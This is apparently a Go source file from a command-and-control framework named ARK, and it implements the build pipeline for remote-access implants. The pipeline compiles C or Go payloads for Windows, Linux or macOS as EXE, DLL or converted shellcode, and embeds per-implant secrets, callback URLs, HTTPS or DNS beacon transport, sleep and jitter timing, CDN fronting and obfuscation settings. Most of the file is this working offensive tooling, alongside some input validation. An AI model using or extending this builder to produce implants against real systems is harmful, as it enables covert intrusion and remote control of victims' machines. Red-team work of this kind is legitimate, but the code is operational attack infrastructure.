package builder

import (
	"context"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	zcrypto "github.com/KKingZero/ARK/pkg/crypto"
	"github.com/KKingZero/ARK/server/db"
	"golang.org/x/crypto/bcrypt"
)

// buildTimeout is the maximum duration for a single implant build.
const buildTimeout = 5 * time.Minute

const (
	DefaultLanguage  = "c"
	DefaultOS        = "windows"
	DefaultArch      = "amd64"
	DefaultFormat    = FormatEXE
	DefaultTransport = "https"
	DefaultCallback  = "https://127.0.0.1:443"
	DefaultSleepMs   = 500
	DefaultJitterPct = 10
	MinSleepMs       = 100
	MaxSleepMs       = 86400000
	MinJitterPct     = 0
	MaxJitterPct     = 100
)

// validDomainRe matches valid domain names.
var validDomainRe = regexp.MustCompile(`^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$`)

// validateLdflagValue rejects values that would break the Makefile recipe or -X ldflags quoting.
// A newline in a make variable becomes a second recipe line.
func validateLdflagValue(val, name string) error {
	for _, r := range val {
		if r < 0x20 || r == 0x7f || r == '#' || r == ' ' {
			return fmt.Errorf("%s contains unsafe characters for the build recipe", name)
		}
	}
	if strings.ContainsAny(val, "'\"\\`$") {
		return fmt.Errorf("%s contains unsafe characters for the build recipe", name)
	}
	return nil
}

// Format specifies the output format of the implant.
type Format string

const (
	FormatEXE       Format = "exe"
	FormatShellcode Format = "shellcode"
	FormatDLL       Format = "dll"
)

// BuildRequest contains all parameters needed to build an implant.
type BuildRequest struct {
	Language      string // "c" (default), "go"
	OS            string // "windows", "linux", "darwin"
	Arch          string // "amd64", "arm64"
	Transport     string // "https", "dns"
	Callbacks     []string
	SleepMs       int64
	JitterPct     int32
	Garble        bool
	CDNDomain     string
	DNSDomain     string
	DNSServer     string
	Format        Format
	Operator      string
	ImplantSecret string // hex-encoded
	CACertPath    string
	ProjectRoot   string // path to the project root for build
}

// BuildResult contains the output of a successful build.
type BuildResult struct {
	BuildID       string
	Binary        []byte
	Filename      string
	Format        Format
	SizeBytes     int64
	ImplantID     string // unique implant identity embedded in binary
	ImplantSecret string // hex-encoded per-implant PSK (store sealed server-side; not returned to clients)
}

// NormalizeBuildRequest applies build defaults and rejects unsupported shared inputs.
func NormalizeBuildRequest(req *BuildRequest) error {
	if req.Language == "" {
		req.Language = DefaultLanguage
	}
	if req.Language != "c" && req.Language != "go" {
		return fmt.Errorf("unsupported implant language: %s (available: c, go)", req.Language)
	}
	if req.OS == "" {
		req.OS = DefaultOS
	}
	if req.OS != "windows" && req.OS != "linux" && req.OS != "darwin" {
		return fmt.Errorf("unsupported OS: %s (available: windows, linux, darwin)", req.OS)
	}
	if req.Arch == "" {
		req.Arch = DefaultArch
	}
	if req.Arch != "amd64" && req.Arch != "arm64" {
		return fmt.Errorf("unsupported arch: %s (available: amd64, arm64)", req.Arch)
	}
	if req.Transport == "" {
		req.Transport = DefaultTransport
	}
	if req.Transport != "https" && req.Transport != "dns" {
		return fmt.Errorf("unsupported transport: %s (available: https, dns)", req.Transport)
	}
	if req.Format == "" {
		req.Format = DefaultFormat
	}
	if req.Format != FormatEXE && req.Format != FormatDLL && req.Format != FormatShellcode {
		return fmt.Errorf("unsupported format: %s (available: exe, dll, shellcode)", req.Format)
	}
	if len(req.Callbacks) == 0 {
		req.Callbacks = []string{DefaultCallback}
	}
	for _, cb := range req.Callbacks {
		parsed, err := url.ParseRequestURI(cb)
		if err != nil {
			return fmt.Errorf("invalid callback URL %q: %v", cb, err)
		}
		if req.Transport == "https" && parsed.Scheme != "https" {
			return fmt.Errorf("invalid callback URL %q: https transport requires https callback URL", cb)
		}
	}
	if req.SleepMs == 0 {
		req.SleepMs = DefaultSleepMs
	}
	if req.SleepMs < MinSleepMs || req.SleepMs > MaxSleepMs {
		return fmt.Errorf("sleep_ms must be %d-%d", MinSleepMs, MaxSleepMs)
	}
	if req.JitterPct < MinJitterPct || req.JitterPct > MaxJitterPct {
		return fmt.Errorf("jitter_pct must be %d-%d", MinJitterPct, MaxJitterPct)
	}
	return nil
}

// Build orchestrates the implant build process.
func Build(req *BuildRequest) (*BuildResult, error) {
	if err := NormalizeBuildRequest(req); err != nil {
		return nil, err
	}
	if req.Language == "c" {
		return BuildC(req)
	}

	if strings.EqualFold(req.OS, "linux") || strings.EqualFold(req.OS, "darwin") {
		return nil, fmt.Errorf("go implant on %s is archived; use language=c (make implant-c-linux)", req.OS)
	}

	implantID, err := zcrypto.RandomID(16)
	if err != nil {
		return nil, fmt.Errorf("generate implant ID: %w", err)
	}

	// Always generate a unique per-implant secret (do not reuse fleet ImplantSecret).
	secretBytes, err := zcrypto.RandomBytes(32)
	if err != nil {
		return nil, fmt.Errorf("generate secret: %w", err)
	}
	secret := hex.EncodeToString(secretBytes)
	req.ImplantSecret = secret

	callbackURL := req.Callbacks[0]

	// C1: Validate all inputs before embedding in ldflags
	if _, err := url.ParseRequestURI(callbackURL); err != nil {
		return nil, fmt.Errorf("invalid callback URL: %w", err)
	}
	if err := validateLdflagValue(callbackURL, "callbackURL"); err != nil {
		return nil, err
	}
	if req.CDNDomain != "" {
		return nil, fmt.Errorf("Go HTTPS implant builds do not support CDNDomain with strict CA pinning; use language=c or omit CDNDomain")
	}
	if req.CACertPath != "" {
		if err := validateLdflagValue(req.CACertPath, "CACertPath"); err != nil {
			return nil, err
		}
		// M11: Validate CA cert path exists and is valid PEM
		if _, err := os.Stat(req.CACertPath); err != nil {
			return nil, fmt.Errorf("CA cert path does not exist: %w", err)
		}
	}

	// Build ldflags
	module := "github.com/KKingZero/ARK"
	ldflags := []string{
		"-s", "-w",
		fmt.Sprintf("-X '%s/implant.implantID=%s'", module, implantID),
		fmt.Sprintf("-X '%s/implant.implantSecret=%s'", module, secret),
		fmt.Sprintf("-X '%s/implant.callbackURL=%s'", module, callbackURL),
		fmt.Sprintf("-X '%s/implant.sleepMs=%d'", module, req.SleepMs),
		fmt.Sprintf("-X '%s/implant.jitterPct=%d'", module, req.JitterPct),
		fmt.Sprintf("-X '%s/implant.transportType=%s'", module, req.Transport),
	}

	if req.CDNDomain != "" {
		ldflags = append(ldflags, fmt.Sprintf("-X '%s/implant.cdnDomain=%s'", module, req.CDNDomain))
	}
	if req.Transport == "dns" {
		if req.DNSDomain == "" {
			return nil, fmt.Errorf("dns_domain required when transport=dns")
		}
		if !validDomainRe.MatchString(strings.TrimSuffix(req.DNSDomain, ".")) {
			return nil, fmt.Errorf("invalid DNS domain: %s", req.DNSDomain)
		}
		if err := validateLdflagValue(req.DNSDomain, "DNSDomain"); err != nil {
			return nil, err
		}
		ldflags = append(ldflags, fmt.Sprintf("-X '%s/implant.dnsDomain=%s'", module, req.DNSDomain))
		if req.DNSServer != "" {
			if err := validateLdflagValue(req.DNSServer, "DNSServer"); err != nil {
				return nil, err
			}
			ldflags = append(ldflags, fmt.Sprintf("-X '%s/implant.dnsServer=%s'", module, req.DNSServer))
		}
	}

	// HTTPS Go implants require an embedded CA (fail closed — no InsecureSkipVerify).
	transport := req.Transport
	if transport == "" {
		transport = "https"
	}
	if transport == "https" {
		if req.CACertPath == "" {
			return nil, fmt.Errorf("CACertPath required for HTTPS Go implant builds (teamserver ca-cert.pem)")
		}
		caPEM, err := os.ReadFile(req.CACertPath)
		if err != nil {
			return nil, fmt.Errorf("read CA cert: %w", err)
		}
		ldflags = append(ldflags, fmt.Sprintf("-X '%s/implant.caCertPEM=%s'", module, base64.StdEncoding.EncodeToString(caPEM)))
	} else if req.CACertPath != "" {
		caPEM, err := os.ReadFile(req.CACertPath)
		if err != nil {
			return nil, fmt.Errorf("read CA cert: %w", err)
		}
		ldflags = append(ldflags, fmt.Sprintf("-X '%s/implant.caCertPEM=%s'", module, base64.StdEncoding.EncodeToString(caPEM)))
	}

	// Determine output file
	tmpDir, err := os.MkdirTemp("", "ark-build-*")
	if err != nil {
		return nil, fmt.Errorf("create temp dir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	var outputFile string
	var buildArgs []string

	env := []string{
		fmt.Sprintf("GOOS=%s", req.OS),
		fmt.Sprintf("GOARCH=%s", req.Arch),
	}

	switch req.Format {
	case FormatDLL:
		outputFile = filepath.Join(tmpDir, "implant.dll")
		env = append(env, "CGO_ENABLED=1")
		if req.OS == "windows" && req.Arch == "amd64" {
			env = append(env, "CC=x86_64-w64-mingw32-gcc")
		}
		buildArgs = []string{
			"build",
			"-buildmode=c-shared",
			"-tags", "dll",
			"-ldflags", strings.Join(ldflags, " "),
			"-o", outputFile,
			"./cmd/implant",
		}
	default:
		ext := ""
		if req.OS == "windows" {
			ext = ".exe"
		}
		outputFile = filepath.Join(tmpDir, "implant"+ext)
		buildArgs = []string{
			"build",
			"-ldflags", strings.Join(ldflags, " "),
			"-o", outputFile,
			"./cmd/implant",
		}
	}

	// C2: Validate and resolve ProjectRoot — must be within expected bounds
	projectRoot := req.ProjectRoot
	if projectRoot == "" {
		projectRoot = "."
	}
	absRoot, err := filepath.Abs(projectRoot)
	if err != nil {
		return nil, fmt.Errorf("resolve project root: %w", err)
	}
	// Verify it looks like an ARK project (has go.mod)
	if _, err := os.Stat(filepath.Join(absRoot, "go.mod")); err != nil {
		return nil, fmt.Errorf("project root %s does not contain go.mod", absRoot)
	}

	// C7: Add build timeout to prevent resource exhaustion
	ctx, cancel := context.WithTimeout(context.Background(), buildTimeout)
	defer cancel()

	// M12: Pre-check mingw toolchain for DLL builds
	if req.Format == FormatDLL && req.OS == "windows" && req.Arch == "amd64" {
		if _, err := exec.LookPath("x86_64-w64-mingw32-gcc"); err != nil {
			return nil, fmt.Errorf("DLL build requires mingw32 toolchain: x86_64-w64-mingw32-gcc not found in PATH")
		}
	}

	// Run go build
	cmd := exec.CommandContext(ctx, "go", buildArgs...)
	cmd.Dir = absRoot
	cmd.Env = append(os.Environ(), env...)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("go build failed: %w\n%s", err, string(output))
	}

	// Read the built binary
	binary, err := os.ReadFile(outputFile)
	if err != nil {
		return nil, fmt.Errorf("read output: %w", err)
	}

	// Convert to shellcode if requested
	if req.Format == FormatShellcode {
		shellcode, err := PE2Shellcode(binary)
		if err != nil {
			return nil, fmt.Errorf("PE to shellcode: %w", err)
		}
		binary = shellcode
	}

	// Generate build ID
	buildID, err := zcrypto.RandomID(8)
	if err != nil {
		return nil, fmt.Errorf("generate build ID: %w", err)
	}
	filename := fmt.Sprintf("implant-%s", buildID)
	switch req.Format {
	case FormatEXE:
		if req.OS == "windows" {
			filename += ".exe"
		}
	case FormatDLL:
		filename += ".dll"
	case FormatShellcode:
		filename += ".bin"
	}

	return &BuildResult{
		BuildID:       buildID,
		Binary:        binary,
		Filename:      filename,
		Format:        req.Format,
		SizeBytes:     int64(len(binary)),
		ImplantID:     implantID,
		ImplantSecret: secret,
	}, nil
}

// RecordBuild stores build metadata in the database.
func RecordBuild(store *db.Store, req *BuildRequest, result *BuildResult) error {
	// H6: Propagate bcrypt error instead of swallowing
	secretHash, err := bcrypt.GenerateFromPassword([]byte(req.ImplantSecret), bcrypt.DefaultCost)
	if err != nil {
		return fmt.Errorf("hash implant secret: %w", err)
	}

	// L6: Populate evasion field with build config snapshot
	lang := req.Language
	if lang == "" {
		lang = "c"
	}
	evasion := fmt.Sprintf("language=%s,format=%s,garble=%v", lang, req.Format, req.Garble)
	if req.CDNDomain != "" {
		evasion += ",cdn=" + req.CDNDomain
	}

	return store.CreateBuild(&db.BuildRow{
		ID:         result.BuildID,
		CreatedAt:  time.Now(),
		Operator:   req.Operator,
		OS:         req.OS,
		Arch:       req.Arch,
		Transport:  req.Transport,
		Callbacks:  strings.Join(req.Callbacks, ","),
		SecretHash: string(secretHash),
		Evasion:    evasion,
		Garbled:    req.Garble,
	})
}
